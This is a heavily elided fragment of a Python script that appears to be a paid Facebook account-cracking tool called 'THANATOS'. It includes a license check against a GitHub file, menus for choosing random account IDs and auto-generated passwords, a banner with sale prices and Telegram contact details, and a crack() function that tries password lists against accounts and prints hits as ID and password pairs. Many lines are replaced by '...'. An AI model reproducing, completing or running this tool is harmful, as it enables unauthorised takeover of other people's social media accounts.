...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("https://github.com/THANATOS4545/NEW-THNS/blob/main/NEW-THNS.txt").text 
...
def setting():
	print('')
	print('\x1b[1;91mRANDOM FB [ \x1b[1;92m1\x1b[1;91m ] ')
	print('')
	hu = input('\x1b[1;91mHALBZHIRA = ')
	print('')
	if hu in ['30','030']:
		...
		print('')
		exit()
	print('\x1b[1;91m B-API [\x1b[1;92m 1 \x1b[1;91m] ')
	print('')
	hc = input('\x1b[1;91m HALBZHIRA = ')
	print('')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\x1b[1;91mVIEW APLICATION [\x1b[1;92m t \x1b[1;91m] =')
	if _jembot_ in ['']:
		back()
		...
		taplikasi.append('no')
	print('')
	pwplus=input('\x1b[1;91mAUTO PASS [ \x1b[1;92mt \x1b[1;91m] = ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
▀█████████▄   ███    ███   ███▀▀▀██▄   ███    ███ 
   ...
   [ Github ] = THANATOS4545
   [ TELEGRAM ] = TEAM_1778
   [ PAID ] TOOL 5$ ONE MONTH
   [ NRXE ] TOOL 10$ THREE MONTH
   [ WAIT ] 1 - 3 H [ ! ]
---------------------------------------------------------""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r THANATOS {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{h}THANATOS-OK  {h}{idf} | {h}{pw}')
